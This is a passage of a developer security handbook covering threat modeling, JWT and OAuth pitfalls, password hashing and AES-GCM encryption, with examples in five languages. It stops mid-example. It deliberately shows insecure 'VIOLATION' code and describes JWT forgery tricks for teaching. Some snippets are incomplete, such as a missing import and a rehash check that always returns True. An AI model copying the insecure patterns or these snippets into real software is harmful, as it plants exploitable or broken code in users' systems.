# Developer's Cybersecurity Mastery: The Complete Handbook
## Volume 1–4 | Foundations · Threat Modeling · Cryptography · Secure Coding

> *Build secure software like engineers at Google, Microsoft, Stripe, Netflix, AWS, Cloudflare, and OpenAI.*
> *Every concept. Every attack. Every defense. Five languages. Zero compromises.*

---

# PART 1 — SECURITY FOUNDATIONS

---

## Chapter 1: Thinking Like an Attacker

### 1.1 The Attacker's Mindset

Security is not a checklist. It is a continuous adversarial contest between a defender who must protect every surface and an attacker who only needs to find one exploitable path. The asymmetry is brutal: you must be right every time; they only have to be right once.

The fundamental discipline is **threat-centric thinking** — before you write a single line of code, you must ask: "If I wanted to break this, how would I?"

This is not paranoia. It is engineering. The most secure systems in production were designed by people who genuinely tried to destroy what they were building before they shipped it.

### 1.2 The Attack Surface Taxonomy

An **attack surface** is the totality of different points where an attacker can try to enter or extract data from your system.

**External attack surface** — everything reachable from the internet:
- HTTP/HTTPS endpoints (REST APIs, GraphQL, WebSocket)
- Authentication flows (login, OAuth callbacks, password reset links)
- File upload endpoints
- Third-party integrations (webhooks, OAuth providers)
- DNS records, subdomains, SSL certificates
- Web application firewalls, CDN configurations

**Internal attack surface** — reachable after initial access:
- Inter-service calls (gRPC, message queues, internal APIs)
- Database connection strings and credentials
- Secrets in environment variables
- Service account permissions
- Log pipelines that contain PII or tokens
- Admin dashboards and internal tooling

**Supply chain attack surface** — your dependencies and build system:
- npm/pip/Maven/Cargo packages and their transitive deps
- Docker base images
- CI/CD pipelines and runners
- Signing keys for artifacts
- GitHub Actions, third-party Actions runners

**Human attack surface** — the people operating the system:
- Phishing against engineers for cloud credentials
- Social engineering of support staff
- Insider threats from privileged access
- Compromised personal devices accessing corporate systems

```
┌─────────────────────────────────────────────────────────────────┐
│                      COMPLETE ATTACK SURFACE                    │
│                                                                 │
│  EXTERNAL                INTERNAL              SUPPLY CHAIN     │
│  ─────────               ────────              ────────────     │
│  • HTTP APIs             • Microservices       • Dependencies   │
│  • Auth flows            • DB connections      • Base images    │
│  • File uploads          • Message queues      • CI/CD runners  │
│  • OAuth callbacks       • Secrets/env         • Signing keys   │
│  • Subdomains            • Admin UIs           • Package repos  │
│  • Webhooks              • Log pipelines       • Build scripts  │
│                                                                 │
│                    HUMAN                                        │
│                    ─────                                        │
│                    • Phishing                                   │
│                    • Social engineering                         │
│                    • Insider threats                            │
│                    • Compromised devices                        │
└─────────────────────────────────────────────────────────────────┘
```

### 1.3 The Cyber Kill Chain

The Lockheed Martin Kill Chain describes the stages of a targeted cyber attack. Understanding it lets you place defensive controls at multiple stages, so that failing at one stage does not mean failing completely.

```
KILL CHAIN STAGE         WHAT HAPPENS                  YOUR DEFENSE
─────────────────────────────────────────────────────────────────────
1. Reconnaissance        Attacker profiles your         Reduce public footprint
                         app, APIs, engineers           Scrub metadata from responses
                                                        No stack traces in prod

2. Weaponization         Crafts exploit payload         Dependency scanning
                         (SQLi, XSS, malware)           Secure defaults in code

3. Delivery              Sends payload to target        WAF, Input validation
                         (HTTP request, phishing)       Rate limiting, CAPTCHA

4. Exploitation          Payload triggers vuln          OWASP Top 10 fixes
                         (SQLi, RCE, SSRF)              Least privilege

5. Installation          Installs backdoor/shell        Read-only filesystems
                         in your container/server       Immutable infrastructure

6. C2 (Command           Establishes comms channel      Egress filtering
   & Control)            to attacker's server           Network policies

7. Exfiltration /        Steals data, moves laterally,  DLP, anomaly detection
   Impact                encrypts for ransom            Secrets rotation, backups
```

### 1.4 MITRE ATT&CK for Developers

MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. As a developer, focus on the **techniques that are enabled by bad code**:

**T1190 — Exploit Public-Facing Application**: SQL injection, SSRF, RCE through deserialization, path traversal. Your code is the entry point.

**T1059 — Command and Script Interpreter**: Command injection through `os.system()`, `subprocess`, `Runtime.exec()`. Your code executes the attacker's commands.

**T1552 — Unsecured Credentials**: Hard-coded API keys, credentials in git history, `.env` files committed to repos. Your code stores secrets unsafely.

**T1565 — Data Manipulation**: Your app processes data without integrity validation, letting an attacker modify prices, roles, or business logic.

**T1078 — Valid Accounts**: Broken authentication lets attackers use legitimate accounts. Your session management or token validation is flawed.

### 1.5 Defense in Depth

No single security control is sufficient. Defense in depth means layering controls so that the failure of any one control does not result in a complete compromise.

```
DEFENSE IN DEPTH LAYERS
───────────────────────

Layer 7: Application Code
  └── Input validation, parameterized queries, output encoding

Layer 6: Authentication & Authorization
  └── MFA, least privilege RBAC, token validation

Layer 5: API Gateway / WAF
  └── Rate limiting, IP allowlisting, request inspection

Layer 4: Service Mesh / Network
  └── mTLS between services, network policies

Layer 3: Infrastructure / Cloud
  └── IAM least privilege, security groups, VPCs

Layer 2: Data Layer
  └── Encryption at rest, column-level encryption, backups

Layer 1: Secrets & Key Management
  └── Vault, KMS, secret rotation, no hard-coded secrets

Principle: An attacker who bypasses Layer 7 (e.g., finds an unvalidated
           endpoint) still hits Layers 6–1 before reaching the data.
```

---

## Chapter 2: CIA Triad — The Three Pillars of Security

### 2.1 Confidentiality

Data must only be accessible to those who have legitimate authority to access it.

**Violations:** Exposed S3 bucket containing customer PII, unencrypted database backups on a public endpoint, API returning more data than the caller is authorized to see (over-fetching), JWT with sensitive claims readable by anyone who decodes it.

**Code manifestation:**

```python
# VIOLATION: Returns full user object including password hash, internal_id, billing_data
@app.get("/users/{user_id}")
def get_user(user_id: int):
    return db.query("SELECT * FROM users WHERE id = ?", user_id)

# CORRECT: Explicit projection + authorization check
@app.get("/users/{user_id}")
def get_user(user_id: int, current_user: User = Depends(get_current_user)):
    if current_user.id != user_id and not current_user.is_admin:
        raise HTTPException(403, "Forbidden")
    user = db.query(
        "SELECT id, email, display_name, created_at FROM users WHERE id = ?",
        user_id
    )
    return UserPublicSchema.from_orm(user)
```

### 2.2 Integrity

Data must not be altered in unauthorized ways — either in transit or at rest.

**Violations:** A price parameter in a URL that users can tamper with, an order total calculated client-side and trusted server-side, JWT payload modified without detection, unsigned configuration files that can be swapped.

**Code manifestation:**

```typescript
// VIOLATION: Trust client-side price calculation
app.post('/checkout', async (req, res) => {
  const { cartItems, totalPrice } = req.body; // attacker sends totalPrice = 0.01
  await chargeCard(req.body.cardToken, totalPrice);
});

// CORRECT: Server-side price calculation, client data is untrusted input
app.post('/checkout', async (req, res) => {
  const { cartItems, cardToken } = req.body;
  const cartFromDB = await Cart.findByItems(cartItems, req.user.id);
  const serverCalculatedTotal = cartFromDB.reduce(
    (sum, item) => sum + (item.price * item.quantity), 0
  );
  await chargeCard(cardToken, serverCalculatedTotal);
});
```

### 2.3 Availability

Systems must remain accessible to authorized users. Denial of service is a security issue.

**Violations:** No rate limiting on API endpoints (resource exhaustion), unbounded queries (slow joins that time out), dependency on single points of failure, missing circuit breakers.

```go
// VIOLATION: Unbounded query can return millions of rows, causing OOM
func GetAllLogs(db *sql.DB) ([]Log, error) {
    rows, err := db.Query("SELECT * FROM audit_logs")
    // ...
}

// CORRECT: Pagination + timeout context + explicit limits
func GetLogs(db *sql.DB, limit, offset int) ([]Log, error) {
    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()
    rows, err := db.QueryContext(ctx,
        "SELECT id, action, timestamp FROM audit_logs LIMIT $1 OFFSET $2",
        min(limit, 1000), offset, // hard cap at 1000 rows
    )
    // ...
}
```

---

## Chapter 3: Authentication vs. Authorization — A Critical Distinction

### 3.1 The Core Difference

**Authentication (AuthN)**: Verifies *who you are*. "This is Alice."
**Authorization (AuthZ)**: Determines *what you can do*. "Alice can read files but not delete them."

Confusing the two is one of the most common security mistakes. A user can be fully authenticated and still reach data they should never see.

```
FLOW:
  Request
    │
    ▼
  AuthN Middleware ──── Is this a valid token? ────► 401 Unauthorized
    │                   Do we know who this is?
    │ YES
    ▼
  AuthZ Middleware ──── Can this user do THIS ────► 403 Forbidden
    │                   to THIS resource?
    │ YES
    ▼
  Handler Logic
```

### 3.2 Sessions vs. Tokens

**Session-based authentication** (traditional, stateful):
- Server stores session state (in-memory, Redis, DB)
- Client holds only a session ID cookie (opaque, not self-contained)
- Invalidation is instant — delete the session server-side
- Suitable for web apps with server-rendered UIs
- Weakness: requires shared session store in distributed systems

**Token-based authentication** (modern, stateless):
- Server issues a signed token (JWT) containing claims
- Client stores token and sends it with every request
- Server validates signature — no session store required
- Horizontally scalable by default
- Weakness: revocation is hard — tokens remain valid until expiry

### 3.3 JWT Deep Dive — Security Pitfalls and Correct Implementation

JWT (JSON Web Token) is the most misimplemented authentication mechanism in modern software. Understanding its vulnerabilities is essential.

**Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  <- Header (Base64)
.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIn0  <- Payload (Base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  <- Signature
```

**Critical vulnerabilities:**

**Vulnerability 1: Algorithm Confusion (alg:none)**
```
// Attacker changes header to:
{ "alg": "none", "typ": "JWT" }
// And strips the signature.
// A naive verifier accepts it because alg=none means "no signature needed"
```

**Vulnerability 2: HMAC/RSA Confusion**
If your server uses RS256 (asymmetric, public/private key), an attacker can forge tokens by taking your *public key* (which is often published), treating it as an HMAC secret, and signing with HS256. A vulnerable library that auto-detects the algorithm will accept it.

**Vulnerability 3: Weak Secrets**
HS256 with a weak secret can be brute-forced with tools like `hashcat` or `jwt_tool`.

**Vulnerability 4: Missing Claims Validation**
Forgetting to validate `exp` (expiry), `iss` (issuer), `aud` (audience) means tokens that should be rejected are accepted.

**Correct JWT implementation in all five languages:**

```java
// Java — using java-jwt (Auth0) or nimbus-jose-jwt
import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTVerificationException;
import com.auth0.jwt.interfaces.DecodedJWT;

public class JwtService {
    // Use 256-bit secret minimum; in production, load from Vault/KMS
    private static final String SECRET_ENV = System.getenv("JWT_SECRET");
    private static final Algorithm ALGORITHM = Algorithm.HMAC256(SECRET_ENV);
    private static final String ISSUER = "https://api.yourapp.com";
    private static final String AUDIENCE = "app-client";

    public String generateToken(String userId, String role) {
        return JWT.create()
            .withIssuer(ISSUER)
            .withAudience(AUDIENCE)
            .withSubject(userId)
            .withClaim("role", role)
            .withIssuedAt(new Date())
            .withExpiresAt(Date.from(Instant.now().plus(1, ChronoUnit.HOURS)))
            .sign(ALGORITHM);
    }

    public DecodedJWT verifyToken(String token) {
        // Explicitly specify algorithm — prevents alg:none and HMAC/RSA confusion
        var verifier = JWT.require(ALGORITHM)
            .withIssuer(ISSUER)
            .withAudience(AUDIENCE)
            .acceptLeeway(30)           // 30s clock skew tolerance
            .build();
        return verifier.verify(token); // throws JWTVerificationException on failure
    }
}
```

```python
# Python — using python-jose or PyJWT
import os
from datetime import datetime, timedelta, timezone
from jose import jwt, JWTError, ExpiredSignatureError

SECRET_KEY = os.environ["JWT_SECRET"]  # Never hardcode
ALGORITHM  = "HS256"                   # Explicitly pinned; never "RS256" with HMAC key
ISSUER     = "https://api.yourapp.com"
AUDIENCE   = "app-client"

def create_token(user_id: str, role: str) -> str:
    now = datetime.now(tz=timezone.utc)
    claims = {
        "sub": user_id,
        "role": role,
        "iss": ISSUER,
        "aud": AUDIENCE,
        "iat": now,
        "exp": now + timedelta(hours=1),
    }
    return jwt.encode(claims, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=[ALGORITHM],      # Whitelist; prevents alg-switching
            audience=AUDIENCE,
            issuer=ISSUER,
            options={"verify_exp": True, "require": ["exp", "iss", "aud", "sub"]},
        )
        return payload
    except ExpiredSignatureError:
        raise HTTPException(401, "Token expired")
    except JWTError as e:
        raise HTTPException(401, f"Invalid token: {e}")
```

```go
// Go — using golang-jwt/jwt v5
package auth

import (
    "errors"
    "os"
    "time"

    "github.com/golang-jwt/jwt/v5"
)

var jwtSecret = []byte(os.Getenv("JWT_SECRET"))

type Claims struct {
    UserID string `json:"sub"`
    Role   string `json:"role"`
    jwt.RegisteredClaims
}

func GenerateToken(userID, role string) (string, error) {
    claims := Claims{
        UserID: userID,
        Role:   role,
        RegisteredClaims: jwt.RegisteredClaims{
            Issuer:    "https://api.yourapp.com",
            Audience:  jwt.ClaimStrings{"app-client"},
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
        },
    }
    // jwt.SigningMethodHS256 is a type-safe reference, preventing alg:none
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(jwtSecret)
}

func VerifyToken(tokenStr string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(
        tokenStr,
        &Claims{},
        func(token *jwt.Token) (interface{}, error) {
            // Enforce HMAC signing method explicitly
            if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
                return nil, errors.New("unexpected signing method")
            }
            return jwtSecret, nil
        },
        jwt.WithValidMethods([]string{"HS256"}),
        jwt.WithIssuedAt(),
        jwt.WithAudience("app-client"),
        jwt.WithIssuer("https://api.yourapp.com"),
    )
    if err != nil {
        return nil, err
    }
    claims, ok := token.Claims.(*Claims)
    if !ok || !token.Valid {
        return nil, errors.New("invalid token claims")
    }
    return claims, nil
}
```

```rust
// Rust — using jsonwebtoken crate
use jsonwebtoken::{
    decode, encode, Algorithm, DecodingKey, EncodingKey, Header,
    TokenData, Validation,
};
use serde::{Deserialize, Serialize};
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Serialize, Deserialize)]
pub struct Claims {
    pub sub: String,
    pub role: String,
    pub iss: String,
    pub aud: Vec<String>,
    pub iat: u64,
    pub exp: u64,
}

pub fn generate_token(user_id: &str, role: &str, secret: &[u8]) -> Result<String, jsonwebtoken::errors::Error> {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH).unwrap().as_secs();

    let claims = Claims {
        sub: user_id.to_owned(),
        role: role.to_owned(),
        iss: "https://api.yourapp.com".to_owned(),
        aud: vec!["app-client".to_owned()],
        iat: now,
        exp: now + 3600,
    };

    encode(
        &Header::new(Algorithm::HS256), // Explicit algorithm
        &claims,
        &EncodingKey::from_secret(secret),
    )
}

pub fn verify_token(token: &str, secret: &[u8]) -> Result<TokenData<Claims>, jsonwebtoken::errors::Error> {
    let mut validation = Validation::new(Algorithm::HS256); // Whitelist only HS256
    validation.set_audience(&["app-client"]);
    validation.set_issuer(&["https://api.yourapp.com"]);
    validation.validate_exp = true;
    validation.leeway = 30;
    validation.required_spec_claims = vec!["exp", "iss", "aud", "sub"]
        .into_iter().map(String::from).collect();

    decode::<Claims>(token, &DecodingKey::from_secret(secret), &validation)
}
```

```typescript
// TypeScript — using jose (JOSE standard library, replaces jsonwebtoken)
import { SignJWT, jwtVerify, JWTPayload } from 'jose';

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);
const ISSUER    = 'https://api.yourapp.com';
const AUDIENCE  = 'app-client';

interface AppClaims extends JWTPayload {
  role: string;
}

export async function generateToken(userId: string, role: string): Promise<string> {
  return new SignJWT({ role })
    .setProtectedHeader({ alg: 'HS256' }) // Explicit; no dynamic alg
    .setSubject(userId)
    .setIssuer(ISSUER)
    .setAudience(AUDIENCE)
    .setIssuedAt()
    .setExpirationTime('1h')
    .sign(JWT_SECRET);
}

export async function verifyToken(token: string): Promise<AppClaims> {
  const { payload } = await jwtVerify(token, JWT_SECRET, {
    algorithms: ['HS256'],  // Explicit whitelist
    issuer: ISSUER,
    audience: AUDIENCE,
    requiredClaims: ['exp', 'iss', 'aud', 'sub'],
  });
  return payload as AppClaims;
}
```

### 3.4 OAuth 2.0 — Correct Flows

OAuth 2.0 is a **delegation** protocol — it allows a third-party application to access resources on behalf of a user. It is not primarily an authentication protocol (that's OpenID Connect, which layers identity on top of OAuth 2.0).

**The four grant types and when to use them:**

```
GRANT TYPE              USE CASE                    SECURITY LEVEL
──────────────────────────────────────────────────────────────────
Authorization Code      Web apps with backend       ★★★★★
+ PKCE                  SPAs, mobile apps           (always use PKCE)

Client Credentials      M2M, service-to-service     ★★★★★ (no user)

Device Code             CLI tools, smart TVs        ★★★★☆

Password (ROPC)         LEGACY ONLY; avoid          ★★ (deprecated)
```

**Authorization Code + PKCE (the standard for all user-facing apps):**

```
CLIENT                AUTH SERVER            RESOURCE SERVER
  │                        │                        │
  │─── 1. Generate ───────►│                        │
  │    code_verifier       │                        │
  │    code_challenge      │                        │
  │    (SHA256 of verifier)│                        │
  │                        │                        │
  │─── 2. /authorize ─────►│                        │
  │    ?client_id=...      │                        │
  │    &code_challenge=... │                        │
  │    &state=<csrf-token> │                        │
  │                        │                        │
  │◄── 3. redirect ────────│                        │
  │    ?code=AUTH_CODE     │                        │
  │    &state=<same-token> │                        │
  │    (verify state!)     │                        │
  │                        │                        │
  │─── 4. /token ─────────►│                        │
  │    code=AUTH_CODE      │                        │
  │    code_verifier=...   │ (server verifies hash) │
  │                        │                        │
  │◄── 5. access_token ────│                        │
  │       refresh_token    │                        │
  │       id_token         │                        │
  │                        │                        │
  │──────────────────────────── 6. API call ───────►│
  │    Authorization: Bearer <access_token>         │
  │                                                 │
  │◄─────────────────────────── 7. Resource ────────│
```

### 3.5 Password Security — Hashing, Not Encryption

Passwords must be **hashed with a password-specific KDF** (Key Derivation Function), not encrypted and not hashed with a general-purpose hash function (MD5, SHA-256).

**Why general hashes fail:**
- MD5/SHA-256 are fast — attackers can compute billions per second with GPUs
- No salting by default — rainbow tables pre-compute hashes for common passwords
- Identical passwords produce identical hashes — enables batch cracking

**The correct algorithms, ranked:**
1. **Argon2id** (winner of the Password Hashing Competition, 2015) — best choice
2. **bcrypt** — battle-tested, widely supported, slightly weaker than Argon2
3. **scrypt** — memory-hard, good alternative
4. **PBKDF2** — NIST-approved, required in some compliance contexts (FIPS 140)

```python
# Python — using argon2-cffi (preferred) or passlib
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError, VerificationError

ph = PasswordHasher(
    time_cost=2,       # 2 iterations
    memory_cost=65536, # 64 MB — adjust based on server capacity
    parallelism=2,     # 2 parallel threads
    hash_len=32,
    salt_len=16,
)

def hash_password(plaintext: str) -> str:
    return ph.hash(plaintext)

def verify_password(hashed: str, plaintext: str) -> bool:
    try:
        ph.verify(hashed, plaintext)
        # Check if rehashing is needed (if cost parameters were upgraded)
        if ph.check_needs_rehash(hashed):
            return True  # signal to rehash on next write
        return True
    except (VerifyMismatchError, VerificationError):
        return False
```

```java
// Java — using Spring Security (BCrypt) or Argon2 via Bouncy Castle
import org.springframework.security.crypto.argon2.Argon2PasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

@Configuration
public class SecurityConfig {
    @Bean
    public PasswordEncoder passwordEncoder() {
        // Argon2id: saltLength=16, hashLength=32, parallelism=1, memory=65536, iterations=2
        return new Argon2PasswordEncoder(16, 32, 1, 65536, 2);
    }
}

// Usage:
@Service
public class UserService {
    @Autowired PasswordEncoder encoder;

    public User registerUser(String email, String rawPassword) {
        String hashed = encoder.encode(rawPassword); // Argon2id hash with random salt
        return userRepo.save(new User(email, hashed));
    }

    public boolean authenticate(String rawPassword, String storedHash) {
        return encoder.matches(rawPassword, storedHash);
        // Automatically handles timing-safe comparison
    }
}
```

```go
// Go — using golang.org/x/crypto/argon2
package auth

import (
    "crypto/rand"
    "crypto/subtle"
    "encoding/base64"
    "golang.org/x/crypto/argon2"
)

type Argon2Params struct {
    Memory      uint32 // 64 MB
    Iterations  uint32 // 2
    Parallelism uint8  // 2 threads
    SaltLength  uint32 // 16 bytes
    KeyLength   uint32 // 32 bytes
}

var DefaultParams = &Argon2Params{65536, 2, 2, 16, 32}

func HashPassword(password string) (string, error) {
    salt := make([]byte, DefaultParams.SaltLength)
    if _, err := rand.Read(salt); err != nil {
        return "", err
    }
    hash := argon2.IDKey(
        []byte(password),
        salt,
        DefaultParams.Iterations,
        DefaultParams.Memory,
        DefaultParams.Parallelism,
        DefaultParams.KeyLength,
    )
    // Encode as "$argon2id$v=19$m=65536,t=2,p=2$<salt>$<hash>"
    b64Salt := base64.RawStdEncoding.EncodeToString(salt)
    b64Hash := base64.RawStdEncoding.EncodeToString(hash)
    return fmt.Sprintf("$argon2id$v=%d$m=%d,t=%d,p=%d$%s$%s",
        argon2.Version, DefaultParams.Memory, DefaultParams.Iterations,
        DefaultParams.Parallelism, b64Salt, b64Hash), nil
}

func VerifyPassword(password, encodedHash string) (bool, error) {
    // Parse params and salt from encodedHash, recompute hash
    // Use subtle.ConstantTimeCompare to prevent timing attacks
    params, salt, hash, err := decodeHash(encodedHash)
    if err != nil {
        return false, err
    }
    otherHash := argon2.IDKey([]byte(password), salt,
        params.Iterations, params.Memory, params.Parallelism, params.KeyLength)
    return subtle.ConstantTimeCompare(hash, otherHash) == 1, nil
}
```

---

## Chapter 4: Threat Modeling — STRIDE, PASTA, and LINDDUN

### 4.1 Why Threat Modeling Before Code

Threat modeling is the practice of identifying, enumerating, and prioritizing threats to a system before they are exploited. It is most valuable at **design time** — the cost of fixing a security flaw in requirements is 30× cheaper than fixing it in production.

The output of threat modeling is not a report — it is a set of actionable **mitigations** that feed directly into your backlog.

### 4.2 STRIDE

STRIDE is a mnemonic for six threat categories, developed by Microsoft. Apply it to each component and data flow in your system.

```
THREAT          VIOLATES       EXAMPLE                         MITIGATION
──────────────────────────────────────────────────────────────────────────────
Spoofing        AuthN          Impersonating another user's    Strong AuthN
                               session by guessing weak        + MFA
                               session tokens

Tampering       Integrity      Modifying a price or role       Digital
                               in a request parameter          signatures,
                                                               server-side
                                                               recalculation

Repudiation     Non-           User claims they never          Audit logs
                repudiation    made a transaction              with timestamps
                                                               and user context

Information     Confidentiality Error messages reveal          Sanitize error
Disclosure                      stack traces, SQL queries,     messages,
                                internal paths                 generic errors

Denial of       Availability   Unthrottled API endpoint        Rate limiting,
Service                        exhausted by attacker           timeouts,
                                                               circuit breakers

Elevation of    AuthZ          User modifies their JWT         Server-side
Privilege                      role claim from "user"          authz checks,
                               to "admin"                      immutable claims
```

**Worked example — SaaS login endpoint:**

```
Component: POST /api/auth/login
─────────────────────────────────────────────────────
S - Spoofing:
    Threat: Attacker brute-forces another user's password
    Mitigation: Rate limit by IP + by username (5 attempts / 15 min)
                Account lockout after N failures
                Argon2id password hashing (slows brute force)
                MFA for sensitive accounts

T - Tampering:
    Threat: Man-in-the-middle modifies credentials in transit
    Mitigation: TLS 1.3, HSTS headers, certificate transparency

R - Repudiation:
    Threat: User denies logging in from an attacker's IP
    Mitigation: Audit log with timestamp, IP, user-agent, geo for all logins

I - Information Disclosure:
    Threat: "User not found" vs "Wrong password" reveals account existence
    Mitigation: Return identical message for both cases
                Use constant-time comparison to prevent timing oracle

D - Denial of Service:
    Threat: Attacker hammers login endpoint to exhaust DB connections
    Mitigation: Rate limiting at API gateway layer
                Captcha after N failures
                Queue-based auth processing

E - Elevation of Privilege:
    Threat: JWT token claims are trusted without server-side validation
    Mitigation: Sign tokens with server secret, validate every request
                Never trust client-supplied roles
```

### 4.3 LINDDUN — Privacy Threat Modeling

LINDDUN extends threat modeling to privacy specifically, critical for GDPR, HIPAA, and CCPA compliance.

```
LINDDUN THREAT         EXAMPLE                          MITIGATION
─────────────────────────────────────────────────────────────────────────
Linking                Correlating a user's             Data minimization
                       purchases with health data       Pseudonymization
                       across two services

Identifying            Re-identifying "anonymous"       K-anonymity
                       data from zip+age+sex            Differential privacy

Non-repudiation        User cannot deny having          Data access logs
                       accessed sensitive info          (ironic: this is a
                                                        privacy threat)

Detecting              Inferring private info from      Traffic analysis
                       traffic patterns alone           protection
                       (user is pregnant from
                       browsing patterns)

Data Disclosure        Data breach exposes PII          Encryption at rest
                                                        Column-level
                                                        encryption

Unawareness            Users don't know their           Privacy notices
                       location is tracked              Consent management

Non-compliance         Processing data without          Data inventory
                       legal basis                      Consent tracking
                                                        DPA agreements
```

---

# PART 2 — CRYPTOGRAPHY FOR DEVELOPERS

---

## Chapter 5: Symmetric Encryption

### 5.1 When to Use Symmetric Encryption

Symmetric encryption uses the same key to encrypt and decrypt. It is:
- Fast — suitable for large data (files, database fields, disk)
- Key distribution problem — how do you securely share the key?

**The two algorithms you should use:**
- **AES-256-GCM** — standard, FIPS-approved, hardware-accelerated on modern CPUs
- **ChaCha20-Poly1305** — excellent on devices without AES hardware (IoT, mobile)

**What you must never use:**
- AES-ECB — deterministic, identical plaintext blocks produce identical ciphertext
- AES-CBC without authentication — vulnerable to padding oracle attacks
- DES/3DES — broken, deprecated
- RC4 — broken

**GCM (Galois/Counter Mode) is AEAD (Authenticated Encryption with Associated Data) — it provides both encryption and authentication in one operation. If the ciphertext is tampered with, decryption fails explicitly rather than silently returning garbage.**

```python
# Python — AES-256-GCM using cryptography library
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt(key: bytes, plaintext: bytes, associated_data: bytes = b"") -> bytes:
    """
    key: 32 bytes (256-bit). Must be generated by a CSPRNG or KMS.
    Returns: nonce (12 bytes) + ciphertext + tag (16 bytes) concatenated.
    """
    assert len(key) == 32, "AES-256 requires 32-byte key"
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)  # 96-bit nonce; MUST be unique per encryption
    ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)
    return nonce + ciphertext  # prepend nonce for storage; not secret

def decrypt(key: bytes, payload: bytes, associated_data: bytes = b"") -> bytes:
    """
    Raises cryptography.exceptions.InvalidTag if ciphertext was tampered.
    This is the expected authentication failure — catch explicitly.
    """
    aesgcm = AESGCM(key)
    nonce = payload[:12]
    ciphertext = payload[12:]
    return aesgcm.decrypt(nonce, ciphertext, associated_data)
    # Raises InvalidTag if authentication fails
```

```java
// Java — AES-256-GCM using javax.crypto
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.security.SecureRandom;

public class AesGcmCipher {
    private static final int GCM_IV_LENGTH  = 12;  // 96 bits
    private static final int GCM_TAG_LENGTH = 128; // 128-bit authentication tag

    public static byte[] encrypt(SecretKey key, byte[] plaintext, byte[] aad)
            throws Exception {
        byte[] iv = new byte[GCM_IV_LENGTH];
        new SecureRandom().nextBytes(iv); // Cryptographically secure random IV

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, key,
            new GCMParameterSpec(GCM_TAG_LENGTH, iv));
        if (aad != null) cipher.updateAAD(aad);

        byte[] ciphertext = cipher.doFinal(plaintext);
        byte[] output = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, output, 0, iv.length);
        System.arraycopy(ciphertext, 0, output, iv.length, ciphertext.length);
        return output;
    }

    public static byte[] decrypt(SecretKey key, byte[] payload, byte[] aad)
            throws Exception {
        byte[] iv         = Arrays.copyOfRange(payload, 0, GCM_IV_LENGTH);
        byte[] ciphertext = Arrays.copyOfRange(payload, GCM_IV_LENGTH, payload.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, key,
            new GCMParameterSpec(GCM_TAG_LENGTH, iv));
        if (aad != null) cipher.updateAAD(aad);
        return cipher.doFinal(ciphertext); // AEADBadTagException if tampered
    }
}
```

```go
// Go — AES-256-GCM
package crypto

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "errors"
    "io"
)

func Encrypt(key, plaintext, additionalData []byte) ([]byte, error) {
    if len(key) != 32 {
        return nil, errors.New("key must be 32 bytes for AES-256")
    }
    block, err := aes.NewCipher(key)
    if err != nil { return nil, err }

    gcm, err := cipher.NewGCM(block)
    if err != nil { return nil, err }

    nonce := make([]byte, gcm.NonceSize()) // 12 bytes
    if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }
    ciphertext := gcm.Seal(nonce, nonce, plaintext, additionalData)
    return ciphertext, nil
}

func Decrypt(key, payload, additionalData []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil { return nil, err }

    gcm, err := cipher.NewGCM(block)
    if err != nil { return nil, err }

    nonceSize := gcm.NonceSize()
    if len(payload) < nonceSize {
        return nil, errors.New("ciphertext too short")
    }
    nonce, ciphertext := payload[:nonceSize], payload[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, additionalData)
    // Returns error if authentication tag is invalid
}
```

```rust
// Rust — AES-256-GCM using aes-gcm crate
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm, Key, Nonce,
};

pub fn encrypt(key: &[u8; 32], plaintext: &[u8]) -> Result<Vec<u8>, aes_gcm::Error> {
    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng); // 96-bit random nonce

    let ciphertext = cipher.encrypt(&nonce, plaintext)?;
    let mut output = nonce.to_vec();
    output.extend_from_slice(&ciphertext);
    Ok(output)
}

pub fn decrypt(key: &[u8; 32], payload: &[u8]) -> Result<Vec<u8>, aes_gcm::Error> {
    let (nonce_bytes, ciphertext) = payload.split_at(12);
    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce_bytes);
    cipher.decrypt(nonce, ciphertext)
}
```

```typescript
// TypeScript — AES-256-GCM using Web Crypto API (browser + Node.js)
async function generateKey(): Promise<CryptoKey> {
  return crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true,             // extractable
    ['encrypt', 'decrypt']
  );
}

async function encrypt(key: CryptoKey, plaintext: string): Promise<Uint8Array> {
